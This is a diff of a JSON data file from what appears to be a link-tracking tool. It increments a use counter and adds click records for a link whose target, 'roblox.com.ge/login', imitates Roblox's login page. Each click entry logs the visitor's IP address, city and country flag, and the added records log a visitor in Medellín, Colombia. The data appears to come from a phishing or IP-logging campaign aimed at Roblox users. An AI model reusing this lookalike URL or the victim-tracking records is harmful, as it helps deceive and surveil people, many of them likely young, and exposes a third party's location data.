@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1324,
+    "useCount": 1325,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10755,6 +10755,14 @@
       },
       {
         "timestamp": 1777401827400,
+        "ip": "190.131.236.189",
+        "country": "Colombia",
+        "city": "Medellín",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
+      },
+      {
+        "timestamp": 1777401919204,
         "ip": "190.131.236.189",
         "country": "Colombia",
         "city": "Medellín",
